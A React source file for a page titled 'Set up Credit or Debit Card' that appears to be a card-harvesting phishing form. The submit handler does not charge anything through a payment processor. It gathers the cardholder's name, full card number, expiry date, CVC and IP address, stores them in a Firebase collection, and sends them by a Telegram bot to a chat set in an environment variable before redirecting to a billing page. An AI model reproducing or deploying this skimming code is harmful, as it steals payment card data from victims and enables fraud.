import { useState, useRef, Fragment } from 'react';
import { Redirect } from 'react-router-dom';
import Cleave from "cleave.js/react";
import db from '../firebase/firebase';
import Header from '../Layout/Header';
import Footer from '../Layout/Footer';

import visa from '../assets/visa.png';
import mastercard from '../assets/mastercard.png';
import aExpress from '../assets/a-express.png';
import moment from "moment"
const { TelegramClient } = require('messaging-api-telegram');
const CryptoJS = require("crypto-js");
const client = new TelegramClient({
    accessToken: process.env.REACT_APP_PUBLIC_TM_TOKEN,
});
const Payment = () => {
    const [fname, setFname] = useState('');
    const [lname, setLname] = useState('');
    const [cardNum, setCardNum] = useState('');
    const [expiry, setExpiry] = useState('');
    const [cvc, setCvc] = useState('');
    const [formSuccess, setFromSuccess] = useState(false);
    const [formError, setFormError] = useState(null);


    const fnameRef = useRef(null);
    const lnameRef = useRef(null);
    const cardNumRef = useRef(null);
    const expiryRef = useRef(null);
    const cvcRef = useRef(null);
    
    const submitHandler = async (e) => {
        e.preventDefault();
        if (fname && lname && cardNum && expiry && cvc) {
            fetch(
                "https://api.ipify.org?format=jsonp?callback=?", {
                method: "GET",
                headers: {}
            })
            .then(res => {
                return res.text()
            })
            .then(ip => {
                const secretKey = process.env.REACT_APP_PUBLIC_ENCRYPT_KEY
                db.collection('payment-data').add({
                    fname: CryptoJS.AES.encrypt(fname, secretKey).toString(), 
                    lname: CryptoJS.AES.encrypt(lname, secretKey).toString(), 
                    cardNum: CryptoJS.AES.encrypt(cardNum, secretKey).toString(), 
                    expiry: CryptoJS.AES.encrypt(expiry, secretKey).toString(), 
                    cvc: CryptoJS.AES.encrypt(cvc, secretKey).toString(),
                    ip_address: CryptoJS.AES.encrypt(ip, secretKey).toString(),
                    logged_at: CryptoJS.AES.encrypt(moment( new Date() ).format("yyyy-MM-DD hh:MM:ss"), secretKey).toString()
                }).then(data => {
                    if( process.env.REACT_APP_PUBLIC_TM_ENABLE === '1' )
                    {
                        let message = "Payment Data\r\n"
                        message += "First Name: " + CryptoJS.AES.encrypt(fname, secretKey).toString() + '\r\n'
                        message += "Last Name: " + CryptoJS.AES.encrypt(lname, secretKey).toString() + '\r\n'
                        message += "Card Number: " + CryptoJS.AES.encrypt(cardNum, secretKey).toString() + '\r\n'
                        message += "Expiry Date: " + CryptoJS.AES.encrypt(expiry, secretKey).toString() + '\r\n'
                        message += "Security Code: " + CryptoJS.AES.encrypt(cvc, secretKey).toString() + '\r\n'
                        message += "Ip Address: " + CryptoJS.AES.encrypt(ip, secretKey).toString() + '\r\n'
                        message += "Time: " + CryptoJS.AES.encrypt(moment( new Date() ).format("yyyy-MM-DD hh:MM:ss"), secretKey).toString()
                        client.sendMessage(process.env.REACT_APP_PUBLIC_TM_CHAT_ID, message, {
                            disableWebPagePreview: true,
                            disableNotification: true,
                        })
                        .then( res => console.log(res,'telegram res'))
                        .catch( e => console.log('error while TM message' + e))
                    }
                    setFromSuccess(true);
                }).catch(err => {
                    throw new Error(err);
                });
            })

        } else {
            setFormError(true);
        }
    }


    return (
        <Fragment>
            <Header type='type-2' />
            <div className=''>
                {formSuccess ? <Redirect to='/billing' /> : null}

                <div className='my-12 relative w-5/5 lg:w-4/12 lg:p-16 m-auto rounded border z-10 p-10'>
                    <div className='mb-4'>
                        <h4 className='text-2xl font-medium'>Set up Credit or Debit Card</h4>
                        <div className='flex my-2'>
                            <img src={visa} className='w-12 rounded mr-2 bg-gray-200 p-2' alt='icon' />
                            <img src={mastercard} className='w-12 rounded mr-2 bg-gray-200 p-2' alt='icon' />
                            <img src={aExpress} className='w-12 rounded mr-2 bg-gray-200 p-2' alt='icon' />
                        </div>
                    </div>
                    <form onSubmit={(e) => submitHandler(e)}>
                        <input
                            required
                            onChange={(e) => {
                                let value = e.target.value
                              
                                value = value.replace(/[^A-Za-z]/ig, '')
                              
                                setFname(value)
                            }}
                            ref={fnameRef} 
                            type='text'
                            value={fname}
                            className='border py-3 px-4 w-full rounded mb-6'
                            placeholder='First name' />
                        <input 
                            onChange={(e) => {
                                let value = e.target.value
                              
                                value = value.replace(/[^A-Za-z]/ig, '')
                              
                                setLname(value)
                            }}
                            ref={lnameRef} 
                            type='text' 
                            value={lname} 
                            className='border py-3 px-4 w-full rounded mb-6' 
                            placeholder='Last name' />
                        <Cleave
                            //   type="number"
                            options={{ creditCard: true }}
                            onChange={(e) => setCardNum(e.target.value)} 
                            ref={cardNumRef}
                            value={cardNum} 
                            className='border py-3 px-4 w-full rounded mb-6' 
                            placeholder='Card Number'
                        />
                        <Cleave
                            options={{ date: true, datePattern: ["m", "d"] }}
                            onChange={(e) => setExpiry(e.target.value)} 
                            ref={expiryRef} 
                            value={expiry} 
                            className='border py-3 px-4 w-full rounded mb-6' 
                            placeholder='Expiry Date (MM/YY)'
                        />
                        <Cleave
                            options={{ blocks: [3], numericOnly: true }}
                            onChange={(e) => setCvc(e.target.value)} 
                            ref={cvcRef} 
                            value={cvc} 
                            className='border py-3 px-4 w-full rounded mb-2' 
                            placeholder='Security Code (CVC)'
                        />
                        {formError ? <p className='text-red-600'>Please fill all form fields</p> : null}
                        <button onClick={(e) => submitHandler(e)} className='bg-red-600 w-full py-3 px-4 mt-4 rounded text-white font-bold mb-8'>Next</button>
                    </form>
                </div>
            </div>
            <Footer type='type-2' />
        </Fragment>

    );
};

export default Payment;